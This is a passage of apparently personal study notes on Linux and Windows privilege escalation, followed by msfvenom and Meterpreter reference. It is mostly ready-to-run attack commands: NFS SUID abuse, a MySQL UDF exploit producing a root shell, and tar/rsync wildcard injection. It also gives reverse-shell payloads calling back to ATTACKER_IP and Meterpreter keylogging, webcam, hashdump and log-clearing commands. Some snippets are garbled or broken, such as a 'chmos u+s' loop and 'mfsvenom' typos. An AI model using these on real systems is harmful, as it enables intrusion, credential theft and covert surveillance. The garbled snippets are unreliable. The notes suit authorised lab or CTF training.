- Listen on attacker machine and wait for a cron run

</div></div>

## Writable scripts invoked by root

### Look for scripts with root permisions
```sh
find / -name *.sh 2>/dev/null | xargs ls -l
```

```shell
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

if a file is found, in temp create a script and exec the code
```sh
#!/bin/bash
	while true; do
		echo 'chmos u+s >> /tmpa.bash'
	done
```
## Passwords & keys
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check history files

</div>


- Check If a user accidentally types their password
```shell
history
```
```shell
cat ~/.*history | less
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check config files

</div>


- Config files often contain passwords in plaintext or other reversible formats.
- Check what plaintext files is loading some files
```shell
ls /home/user
cat /home/user/myvpn.ovpn
```


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Linux\|LFI-WordList-Linux]]

| **Location**                  | **Description**                                                                                                                                                   |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
| `/etc/passwd`                 | has all registered user that has access to a system                                                                                                               |
| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
| `/root/.bash_history`         | contains the history commands for root user                                                                                                                       |
| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
| `/var/mail/root`              | all emails for root user                                                                                                                                          |
| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| `/var/log/apache2/access.log` | the accessed requests for Apache  webserver                                                                                                                       |


</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check SSH keys

</div>


- Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
- Search `.ssh` folder
- In this example, file called **root_key**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Weak-reused-plaintext passwords

</div>


- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

```shell
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```shell
# Anything interesting the the mail?
/var/spool/mail
```

```shell
./LinEnum.sh -t -k password
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## NFS

</div>


## NFS exploitation
- If  you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
### root_squash
- By **default**, on NFS shares- **Root Squash**ing is **enabled**, and **prevents** anyone connecting to the NFS share from having **root access** to the NFS volume.
- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
- Not what we want. However, **if this is turned off**, it can allow the creation of [[SUID\|SUID]] bit files, allowing a remote user root access to the connected system.
### Check root_squash
On the target machine check which file systems are exporting to remote hosts.
```shell
cat /etc/exports
```
Check if any share has root squashing disabled like:
`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
### Method 1 -  Copy Bash file
- We're **able** to **upload files** to the NFS share, and control the permissions of these files.
- **We can set the permissions** of whatever we upload, in this case a **bash** shell executable.
- We can then log in through SSH and execute this executable to gain a root shell!
1. NFS Access
   Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
2. Gain Low Privilege Shell
3. Download and put the victim bash file to the NFS share
   `scp victimname@VICTIM_IP:/bin/bash /tmp/nfs`
4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash
   ```shell
   sudo chown root bashfile
   sudo chmod +s bashfile
   ```
5. Login through SSH
6. Execute SUID Bit Bash Executable (On the victim machine)
   ```shell
   ./bash -p
   ```
   The `-p` persists the permissions, so that it can run as root with SUID as otherwise bash will sometimes drop the permissions.
7. ROOT ACCESS
### Method 2 - Create Executable file
```shell
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101
```
If it does, then mount it to your filesystem
Log as **root** and mount.
Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
If that succeeds, go to `/tmp/share` or `/tmp/nfs`
There might be some interesting stuff there.
But even if there isn't you might be able to exploit it.
- **Test** if you can **create files**, then check with your low-priv shell **what user** has **created** that file.
- **If it root**, **create** a [[exploit_file_NFS\|exploit_file_NFS]] **or** generate a payload using **msfvenom**
```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
- save it to the mounted share or compile it with [[gcc\|gcc]] (On the victim machine if it's possible to avoid compatibility issues) to get the executable
- set it with **[[SUID\|SUID]]**-permission from your attacking machine.
```shell
chmod 4777 exploit_file
chmod +xs exploit_file
```
 - And then **execute it** with your low privilege shell on the victim machine.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## User Installed Software

</div>


- some third party software that might be vulnerable?. If you find anything google it for exploits.
```shell
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- service is running as root and the "root" user for the service does not have a password assigned
- take advantage of [[UDF\|UDF]] to run system commands as root via the MySQL service.
- https://www.exploit-db.com/exploits/1518
Compile
```shell
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect

	mysql -u root

Create a [[UDF\|UDF]] ) "do_system" using our compiled exploit:
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash   exit

</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Wildcard spare

</div>


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
## chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Execute arbitrary commands:**

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Execute arbitrary commands:**

```
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._

## Zip

**Execute arbitrary commands:**

```
zip name.zip files -T --unzip-command "sh -c whoami"
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Service only available from inside

</div>


- It might be the user is running some service that is only available from that host.
- You **can't** connect to the service from the **outside**.
- It might be a development **server**, a **database**, or anything else.
- These services **might** be running as **root**, or they might have **vulnerabilities** in them.

Check the netstat and compare it with the nmap-scan you did from the outside.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Unmounted filesystems

</div>


- looking for any unmounted filesystems.
- If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

</div></div>

## Kernel and distribution exploits
- Kernel exploits can leave the system in an **unstable state**
- Only run them as a **last resort.**
- Try search on https://www.linuxkernelcves.com/cves
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LES

</div>


- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>

### [[DirtyCow\|DirtyCow]]

# Windows privesc
```powershell
dir /b/s "\*.conf*"
dir /b/s "\*.txt*"
dir /b/s "\*secret*"
route print
netstat -r
fsutil fsinfo drives
wmic logicaldisk get Caption,Description,providername
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Windows account

</div>


The user account type will determine what actions the user can perform on that specific Windows system. 

**Administrator** 
- can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc. 
- Any user with administrative privileges will be part of the **Administrators** group

**Standard User**
- can only make changes to folders/files attributed to the user & can't perform system-level changes, such as install programs.
- Standard users are part of the **Users** group.

# Special built-in account
- Used by the operating system in the context of privilege escalation

| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has **full access** to all files and resources available on the host with **even higher privileges than administrators.** |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Local Service**        | Default account used to **run Windows services** with "minimum" privileges. It will use **anonymous connections** over the network.                                                             |
| **Network Service**      | Default account used to **run Windows services** with "minimum" privileges. It will use the **computer credentials to authenticate** through the network.                                       |
# Other

Right-click on the Start Menu and click **Run**. Type `lusrmgr.msc`. See below

- To protect the local user with such privileges, Microsoft introduced **User Account Control** (UAC). This concept was first introduced with the short-lived [Windows Vista](https://en.wikipedia.org/wiki/Windows_Vista) and continued with versions of Windows that followed.

**Note**: UAC (by default) doesn't apply for the built-in local administrator account. 

How does UAC work? When a user with an account type of administrator logs into a system, the current session doesn't run with elevated permissions. When an operation requiring higher-level privileges needs to execute, the user will be prompted to confirm if they permit the operation to run.

</div></div>

## System enumeration
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### winPEAS

</div>


https://github.com/peass-ng/PEASS-ng/releases
winpeas x64
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
winPEASx64.exe > outputfile.txt
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### PowerUp

</div>


- Clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

| Option                                                         | Description |
| -------------------------------------------------------------- | ----------- |
| `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` | AllChecks   |

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### PrivescCheck

</div>


- [[powershell\|powershell]] script
- https://github.com/itm4n/PrivescCheck
- Search common priv escalation
- No require execution of a binary
```shell
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

| Option                                                                                                                                                     | Description                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`                                                                                     | Basic check only                         |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"`                | Extended checks + human-readable reports |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"` | All checks + all reports                 |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### WES-NG

</div>


- Run on the attacker machine
- https://github.com/bitsadmin/wesng
Get info using `systeminfo.exe` to a `systeminfo.txt` and pass to the attacker machine.
On the victim local
```shell
systeminfo > systeminfo.txt
```
Or remote
```shell
systeminfo /S MyRemoteHost
```
On the attacker machine
```shell
git clone https://github.com/bitsadmin/wesng --depth 1
cd wesng
python wes.py --update
python wes.py systeminfo.txt
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### meterpreter

</div>


## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```

</div></div>

### Other resources
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Abusing Service Misconfigurations
- [[Windows services\|Windows services]]
### CanRestart and writable service
- IF an service is Canrestart True and writeable.
- The Path is
  `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- We can replace the legitimate application with our malicious one
- restart the service, which will run our infected program!
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unquoted Service Paths

</div>


- When we **can't** **write** into service **executables**.
- If a service is configured to point to an "unquoted" executable.
```shell-session
sc qc "vncserver"
```
Correct
![Pasted image 20240821200031.png|600](/img/user/attachments/Pasted%20image%2020240821200031.png)
Example Incorrect
![Pasted image 20240821200138.png|600](/img/user/attachments/Pasted%20image%2020240821200138.png)
- When the [[SCM\|SCM]] tries to execute the binary, a problem arises.
- Since there are **spaces** on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM **doesn't know which** of the following you are trying to **execute**.
- Spaces are used as argument separators unless they are part of a quoted string

| Command                                              | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

Usually that files are installed on system folders but:
- Some installers change the permissions on the installed folders, making the services vulnerable.
- An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

For tis example, check the folder permissions
![Pasted image 20240821211411.png|600](/img/user/attachments/Pasted%20image%2020240821211411.png)
The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[IPS\|IPS]] and [[IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
